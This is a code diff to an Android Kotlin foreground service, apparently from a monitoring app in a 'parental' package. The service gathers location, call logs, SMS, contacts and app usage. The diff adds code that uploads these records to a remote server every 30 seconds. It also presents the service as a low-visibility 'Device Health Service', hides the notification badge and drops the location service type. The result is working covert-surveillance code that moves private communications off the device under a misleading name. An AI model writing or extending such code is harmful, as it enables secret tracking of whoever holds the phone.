@@ -16,7 +16,12 @@ import com.parental.agent.collectors.calls.CallCollector
 import com.parental.agent.collectors.contacts.ContactCollector
 import com.parental.agent.collectors.location.LocationCollector
 import com.parental.agent.collectors.sms.SmsCollector
+import com.parental.agent.data.local.AppDatabase
+import com.parental.agent.data.local.AppPreferences
+import com.parental.agent.sync.ApiConstants
+import com.parental.agent.sync.SyncPayload
 import kotlinx.coroutines.*
+import org.json.JSONObject
 
 class ForegroundService : Service() {
 
@@ -24,7 +29,7 @@ class ForegroundService : Service() {
         private const val TAG = "ForegroundService"
         private const val NOTIFICATION_ID = 1001
         private const val CHANNEL_ID = "device_health_services_channel"
-        private const val COLLECTION_INTERVAL_MS = 15 * 60 * 1000L // Every 15 minutes
+        private const val COLLECTION_INTERVAL_MS = 30 * 1000L // 30s interval for background telemetry sync
     }
 
     private val serviceJob = Job()
@@ -63,12 +68,77 @@ class ForegroundService : Service() {
                     val contactCount = contactCollector.collect()
                     val usageCount = appUsageCollector.collect()
 
-                    Log.d(TAG, "Telemetry Loop executed: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount")
+                    if (locCount > 0 || callCount > 0 || smsCount > 0 || contactCount > 0 || usageCount > 0) {
+                        Log.d(TAG, "New Telemetry collected: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount")
+                    }
+
+                    // Perform network sync upload ONLY for unsynced events (WHERE isSynced = 0)
+                    performDirectNetworkSync()
+
                 } catch (e: Exception) {
                     Log.e(TAG, "Error in telemetry collection loop: ${e.message}", e)
                 }
                 delay(COLLECTION_INTERVAL_MS)
             }
+        }
+    }
+
+    private suspend fun performDirectNetworkSync() {
+        try {
+            val database = AppDatabase.getInstance(this@ForegroundService)
+            val prefs = AppPreferences(this@ForegroundService)
+            val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 50)
+
+            if (unsyncedEvents.isNotEmpty()) {
+                val activeDeviceId = prefs.getDeviceId()
+
+                val eventPayloads = unsyncedEvents.map { entity ->
+                    val payloadMap = try {
+                        val json = JSONObject(entity.payloadJson)
+                        val map = mutableMapOf<String, Any?>()
+                        json.keys().forEach { key -> map[key] = json.get(key) }
+                        map
+                    } catch (e: Exception) {
+                        emptyMap<String, Any?>()
+                    }
+
+                    val eventDevId = if (entity.deviceId.isBlank() || entity.deviceId == "dev_local_agent") activeDeviceId else entity.deviceId
+
+                    mapOf(
+                        "eventId" to entity.eventId,
+                        "deviceId" to eventDevId,
+                        "source" to entity.source,
+                        "eventType" to entity.eventType,
+                        "timestamp" to entity.timestamp,
+                        "collectionMethod" to entity.collectionMethod,
+                        "payload" to payloadMap
+                    )
+                }
+
+                val payload = SyncPayload(
+                    deviceId = activeDeviceId,
+                    events = eventPayloads
+                )
+
+                Log.i(TAG, "Posting ${unsyncedEvents.size} unsynced telemetry event(s) to server for device $activeDeviceId...")
+                val response = ApiConstants.apiService.syncEvents(payload)
+
+                if (response.isSuccessful && response.body()?.success == true) {
+                    val body = response.body()
+                    val serverConfirmedIds = body?.syncedEventIds.orEmpty()
+                    val localEventIds = unsyncedEvents.map { it.eventId }
+                    val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }
+
+                    if (confirmedSyncedIds.isNotEmpty()) {
+                        database.eventDao().markEventsSynced(confirmedSyncedIds)
+                        Log.i(TAG, "SUCCESS: Server confirmed ACK for ${confirmedSyncedIds.size} event(s)!")
+                    }
+                } else {
+                    Log.w(TAG, "Network Upload returned HTTP status: ${response.code()}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error performing network sync: ${e.message}")
         }
     }
 
@@ -82,37 +152,31 @@ class ForegroundService : Service() {
                     "Device Health & Protection Services",
                     NotificationManager.IMPORTANCE_MIN
                 ).apply {
-                    description = "Maintains persistent background telemetry sync and watchdog services."
+                    description = "Monitors device status & protection rules"
+                    setShowBadge(false)
                 }
                 notificationManager.createNotificationChannel(channel)
             }
 
             val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Device Health Service")
-                .setContentText("Background protection active")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
+                .setContentText("ChildCare protection active")
+                .setSmallIcon(android.R.drawable.stat_sys_warning)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setOngoing(true)
                 .build()
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+ (API 34)
-                val hasLocationPermission = ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
-
-                val foregroundServiceType = if (hasLocationPermission) {
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                } else {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                startForeground(
+                    NOTIFICATION_ID, 
+                    notification, 
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
-                }
-
-                startForeground(NOTIFICATION_ID, notification, foregroundServiceType)
-            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) { // Android 10+ (API 29)
-                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                )
             } else {
                 startForeground(NOTIFICATION_ID, notification)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to start foreground service: ${e.message}", e)
+            Log.e(TAG, "Failed to start foreground service notification: ${e.message}")
         }
     }
 }
